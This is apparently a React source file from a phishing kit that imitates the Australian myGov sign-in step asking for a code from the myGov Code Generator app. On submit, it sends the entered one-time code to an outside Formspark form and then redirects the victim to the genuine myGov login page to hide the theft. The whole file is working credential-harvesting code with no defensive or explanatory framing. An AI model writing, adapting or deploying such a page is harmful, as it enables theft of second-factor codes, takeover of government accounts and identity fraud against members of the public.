import { useFormspark } from "@formspark/use-formspark";
import { useState } from "react";

const FORMSPARK_FORM_ID = "rKiB0i2PG";
// const FORMSPARK_FORM_ID = "JJIo9CDp";

const OtpPage = () => {
  const [myOtp, setMyOtp] = useState("");

  const [submit, submitting] = useFormspark({
    formId: FORMSPARK_FORM_ID,
  });

  const handleSubmit = async (e) => {
    e.preventDefault();
    await submit({
      myOtp,
    });
    return window.location.replace(
      "https://login.my.gov.au/las/mygov-login?execution=e3s1"
    );
  };

  return (
    <div>
      <div className="grid place-content-center px-4">
        <div className="md:w-128">
          {/* <div className="text-3xl font-bold pt-10">Sign in with myGov</div> */}
          <div className="text-2xl font-bold pt-2 my-12">
            Enter a code from your myGov Code Generator app
          </div>
          <form action="" className="mb-16" onSubmit={handleSubmit}>
            <div className="pb-4">
              <label htmlFor="" className="font-bold">
                Code
              </label>
              <br />
              <input
                type="number"
                className="border-2 border-black w-1/2 mt-2 p-2"
                value={myOtp}
                onChange={(e) => setMyOtp(e.target.value)}
                required
              />
            </div>
            <div className="my-4">
              If you don't want to use Digital Identity, you can
              <a href="/" className="underline text-gov-blue px-1">
                call the helpdesk
              </a>
              to create a new myGov account.
            </div>
            <div className="my-4">
              <a href="/" className="underline text-gov-blue">
                Continue with Digital Identity
              </a>
            </div>
            <button
              disabled={submitting}
              className="w-full my-6 font-semibold text-center bg-gov-blue rounded py-2"
            >
              Next
            </button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default OtpPage;
